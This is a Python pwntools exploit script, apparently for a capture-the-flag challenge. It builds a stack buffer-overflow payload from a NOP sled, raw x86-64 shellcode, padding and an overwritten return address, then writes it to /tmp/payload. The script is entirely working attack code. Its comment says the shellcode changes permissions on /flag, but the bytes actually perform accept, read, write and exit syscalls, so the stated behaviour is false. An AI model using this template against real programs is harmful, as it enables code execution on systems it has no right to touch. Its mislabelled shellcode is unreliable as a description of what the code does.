from pwn import *

# 1. Configuration
OFFSET = 8007
JUMP_TARGET = 0x7fffffffa9f8 

# 2. Shellcode: chmod("/flag", 4) then exit(0)
shellcode = b'H\xc7\xc7\x03\x00\x00\x00H1\xf6H1\xd2H\xc7\xc0+\x00\x00\x00\x0f\x05H\x89\xc3H\x89\xdfH\x89\xe6H\xc7\xc2\xe8\x03\x00\x00H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\xc7\xc0\x01\x00\x00\x00\x0f\x05H1\xffH\xc7\xc0<\x00\x00\x00\x0f\x05'

# 3. SAFETY PADDING (The Fix)
#    We use 64 bytes instead of 8 to prevent the 'push' instructions
#    from overwriting the shellcode.
safety_padding = b"B" * 64

# 4. Construct
#    [ NOP SLED ] [ SHELLCODE ] [ SAFETY PADDING ] [ RET ADDR ]
total_used = len(shellcode) + len(safety_padding)
nop_len = OFFSET - total_used

if nop_len < 0:
    print("Error: Shellcode too big")
    exit()

payload = b"\x90" * nop_len
payload += shellcode
payload += safety_padding
payload += p64(JUMP_TARGET)

# 5. Write
open("/tmp/payload", "wb").write(payload)
print("[*] Payload fixed: Added 64 bytes of stack safety padding.")
